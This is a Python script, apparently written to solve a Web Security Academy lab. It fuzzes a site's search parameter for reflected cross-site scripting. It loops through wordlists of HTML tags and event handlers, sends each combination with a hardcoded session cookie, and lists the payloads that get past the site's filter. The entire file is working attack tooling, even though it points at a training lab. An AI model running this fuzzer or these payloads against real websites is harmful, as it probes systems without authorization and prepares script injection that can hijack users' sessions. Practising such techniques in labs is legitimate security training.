import requests


target = "https://acb71f311f519d11c0fe299a005c00d6.web-security-academy.net//?search="
session_id = "YecMXVRr2Dp18RpYVIYjSfTo5L2N1P33"
session_cookie = {'session': session_id}


tag_list = open('/opt/wordlists/XSS/tags.txt', 'r')
tags = [i.strip('\n') for i in tag_list]
event_list = open('/opt/wordlists/XSS/events.txt', 'r')
events = [i.strip('\n') for i in event_list]


def xss():
    valid_tags = []
    valid_payloads = []
    for tag in tags:
        print(f'FINDING VALID TAG {tag}')
        search = target + "<" + tag + ">"
        response = requests.get(search, cookies=session_cookie)
        if response.status_code == 200:
            valid_tags.append(tag)
            print(f'FOUND VALID TAG {tag}')


    for tag in valid_tags:
        for event in events:
            payload = f"<{tag} {event}=1>"
            print(f'TESTING PAYLOAD {payload}')
            search = target + payload
            response = requests.get(search, cookies=session_cookie)
            if response.status_code == 200:
                valid_payloads.append(payload)
                print(f"FOUND VALID PAYLOAD {payload}")


    if len(valid_payloads) > 0:
        print('\n\nFOUND THESE PAYLOADS:\n')
        tag_string = "\nValid Tags:"
        for tag in valid_tags:
            tag_string += tag + ','
        print('=====================')
        for payload in valid_payloads:
            print('\n')
            print(payload)



xss()